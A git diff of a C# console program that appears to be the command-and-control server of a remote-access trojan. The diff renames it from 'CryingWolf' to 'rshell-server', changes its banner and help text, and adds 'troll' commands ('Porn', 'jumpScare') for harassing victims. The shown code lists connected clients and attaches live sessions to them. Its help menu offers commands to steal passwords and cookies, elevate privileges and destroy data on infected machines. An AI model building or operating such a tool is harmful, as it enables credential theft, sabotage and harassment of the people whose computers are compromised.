@@ -12,14 +12,14 @@ class Program
 {
     static Server server;
     static List<LiveClient> clients = new List<LiveClient>();
-    static string title = "CryingWolf-server";
+    static string title = "rshell-server";
 
     static void Main(string[] _args)
     {
         Clear();
 
         //start regularly updating the title
-        new Thread(() => {
+        new Thread(()=> {
             while (true)
             {
                 TitleUpdate();
@@ -46,7 +46,7 @@ class Program
         //server commands
         while (true)
         {
-            Console.ForegroundColor = ConsoleColor.Green; Console.Write("CryingWolf");
+            Console.ForegroundColor = ConsoleColor.Green; Console.Write("rshell-server");
             Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write(" > ");
             Console.ForegroundColor = ConsoleColor.White;
             var args = Utils.Parse(Console.ReadLine()).ToList();
@@ -85,13 +85,16 @@ class Program
                         "  passwd",
                         "  bookmarks",
                         "  cookies",
-                        "  discord",
                         "  history",
                         "  elevate",
                         "  destroy",
                         "  pid",
                         "  bin",
                         "  kill",
+                        "",
+                        "Troll commands: ",
+                        "   Porn",
+                        "   jumpScare",
                     }));
                     break;
 
@@ -107,7 +110,7 @@ class Program
                     break;
 
                 case "clients":
-                    LiveClient[] lives = clients.Where((client) => { return client.IsOnline(); }).ToArray();
+                    LiveClient[] lives = clients.Where((client)=> { return client.IsOnline(); }).ToArray();
                     if (lives.Length > 0)
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
@@ -136,7 +139,7 @@ class Program
                         }
                         maxtries = (int)(maxtries * 2);
                     }
-                    Console.WriteLine("Waiting for client to connect... (timeout in " + (maxtries / 2) + " seconds)");
+                    Console.WriteLine("Waiting for client to connect... (timeout in "+(maxtries / 2) +" seconds)");
                     int tries = 0;
                     while (true)
                     {
@@ -168,7 +171,7 @@ class Program
                     {
                         LiveClient found = null;
                         LiveClient[] arr = clients.Where((client) => { return client.IsOnline(); }).ToArray();
-                        for (int i = arr.Length - 1; i >= 0; i--)
+                        for (int i = arr.Length-1; i >= 0; i--)
                         {
                             LiveClient cli = arr[i];
                             if (cli.Name.ToLower().Contains(token.ToLower()) || cli.User.ToLower().Contains(token.ToLower()))
@@ -180,8 +183,7 @@ class Program
                         if (found == null)
                         {
                             Console.WriteLine("Attach failed: Client not found");
-                        }
-                        else
+                        } else
                         {
                             LiveSession(found, found.Token);
                         }
@@ -204,25 +206,21 @@ class Program
         Console.ForegroundColor = ConsoleColor.Yellow;
 
         string[] lines = new string[] {
-    @"    /$$$$$$                      /$$                     /$$      /$$           /$$  /$$$$$$ ",
-    @"   /$$__  $$                    |__/                    | $$  /$ | $$          | $$ /$$__  $$",
-    @"  | $$  \__/  /$$$$$$  /$$   /$$ /$$ /$$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$ | $$| $$  \__/",
-    @"  | $$       /$$__  $$| $$  | $$| $$| $$__  $$ /$$__  $$| $$/$$ $$ $$ /$$__  $$| $$| $$$$    ",
-    @"  | $$      | $$  \__/| $$  | $$| $$| $$  \ $$| $$  \ $$| $$$$_  $$$$| $$  \ $$| $$| $$_/    ",
-    @"  | $$    $$| $$      | $$  | $$| $$| $$  | $$| $$  | $$| $$$/ \  $$$| $$  | $$| $$| $$      ",
-    @"  |  $$$$$$/| $$      |  $$$$$$$| $$| $$  | $$|  $$$$$$$| $$/   \  $$|  $$$$$$/| $$| $$      ",
-    @"   \______/ |__/       \____  $$|__/|__/  |__/ \____  $$|__/     \__/ \______/ |__/|__/      ",
-    @"                       /$$  | $$               /$$  \ $$                                     ",
-    @"                      |  $$$$$$/              |  $$$$$$/                                     ",
-    @"                       \______/                \______/                                      ",
-    @"",
+            @" /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$       /$$      ",
+            @"| $$__  $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      ",
+            @"| $$  \ $$| $$  \__/| $$  | $$| $$      | $$      | $$      ",
+            @"| $$$$$$$/|  $$$$$$ | $$$$$$$$| $$$$$   | $$      | $$      ",
+            @"| $$__  $$ \____  $$| $$__  $$| $$__/   | $$      | $$      ",
+            @"| $$  \ $$ /$$  \ $$| $$  | $$| $$      | $$      | $$      ",
+            @"| $$  | $$|  $$$$$$/| $$  | $$| $$$$$$$$| $$$$$$$$| $$$$$$$$",
+            @"|__/  |__/ \______/ |__/  |__/|________/|________/|________/",
+            @"",
         };
         foreach (string line in lines)
         {
             Console.WriteLine(line);
         }
     }
-
 
     static void Setup_HTTP_Server(int port)
     {
